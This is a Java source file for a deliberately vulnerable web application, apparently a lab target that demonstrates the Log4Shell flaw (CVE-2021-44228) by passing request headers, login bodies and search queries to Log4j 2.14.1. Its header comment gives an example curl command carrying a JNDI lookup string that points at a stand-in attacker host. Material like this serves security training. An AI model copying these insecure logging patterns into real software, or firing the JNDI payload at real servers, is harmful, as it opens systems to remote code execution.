import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.*;
import java.net.InetSocketAddress;
import java.util.stream.Collectors;

/**
 * Vulnerable Web Application — CVE-2021-44228 (Log4Shell)
 * 
 * This application uses Log4j 2.14.1 and logs user-controlled
 * input (headers, parameters) without sanitization.
 * 
 * Attack vector: JNDI injection via HTTP headers
 * Example: curl -H 'X-Api-Version: ${jndi:ldap://attacker:1389/a}' http://target:8080/
 */
public class VulnApp {

    private static final Logger logger = LogManager.getLogger(VulnApp.class);

    public static void main(String[] args) throws IOException {
        int port = 8080;
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        
        server.createContext("/", new MainHandler());
        server.createContext("/api/login", new LoginHandler());
        server.createContext("/api/search", new SearchHandler());
        
        server.setExecutor(null);
        server.start();
        
        logger.info("Server started on port " + port);
        System.out.println("[*] Log4Hell web application running on port " + port);
    }

    // Main page — logs User-Agent and X-Api-Version headers
    static class MainHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String userAgent = exchange.getRequestHeaders().getFirst("User-Agent");
            String apiVersion = exchange.getRequestHeaders().getFirst("X-Api-Version");
            String xff = exchange.getRequestHeaders().getFirst("X-Forwarded-For");
            
            // VULNERABLE: Log4j processes JNDI lookups in logged strings
            logger.info("Request from User-Agent: " + userAgent);
            if (apiVersion != null) {
                logger.info("API Version: " + apiVersion);
            }
            if (xff != null) {
                logger.info("Forwarded for: " + xff);
            }
            
            String response = "<!DOCTYPE html>\n" +
                "<html>\n" +
                "<head><title>Internal Dashboard</title></head>\n" +
                "<body>\n" +
                "<h1>🏢 Corporate Internal Dashboard</h1>\n" +
                "<p>Welcome to the internal management system.</p>\n" +
                "<p>Version: 2.14.1</p>\n" +
                "<ul>\n" +
                "  <li><a href='/api/login'>Login Portal</a></li>\n" +
                "  <li><a href='/api/search'>Search</a></li>\n" +
                "</ul>\n" +
                "<footer>Powered by Log4j</footer>\n" +
                "</body>\n" +
                "</html>";
            
            exchange.sendResponseHeaders(200, response.length());
            OutputStream os = exchange.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }

    // Login endpoint — logs username parameter
    static class LoginHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String method = exchange.getRequestMethod();
            
            if ("POST".equalsIgnoreCase(method)) {
                String body = new BufferedReader(new InputStreamReader(exchange.getRequestBody()))
                    .lines().collect(Collectors.joining("\n"));
                
                // VULNERABLE: Logging POST body containing user input
                logger.info("Login attempt with data: " + body);
                
                String response = "{\"status\": \"error\", \"message\": \"Invalid credentials\"}";
                exchange.getResponseHeaders().set("Content-Type", "application/json");
                exchange.sendResponseHeaders(401, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            } else {
                String response = "<!DOCTYPE html>\n" +
                    "<html><head><title>Login</title></head>\n" +
                    "<body>\n" +
                    "<h2>Login</h2>\n" +
                    "<form method='POST'>\n" +
                    "  <input name='username' placeholder='Username'><br>\n" +
                    "  <input name='password' type='password' placeholder='Password'><br>\n" +
                    "  <button type='submit'>Login</button>\n" +
                    "</form>\n" +
                    "</body></html>";
                exchange.sendResponseHeaders(200, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            }
        }
    }

    // Search endpoint — logs query parameter
    static class SearchHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String query = exchange.getRequestURI().getQuery();
            
            if (query != null) {
                // VULNERABLE: Logging search query
                logger.info("Search query: " + query);
            }
            
            String response = "{\"results\": [], \"query\": \"" + 
                (query != null ? query.replace("\"", "\\\"") : "") + "\"}";
            exchange.getResponseHeaders().set("Content-Type", "application/json");
            exchange.sendResponseHeaders(200, response.length());
            OutputStream os = exchange.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }
}
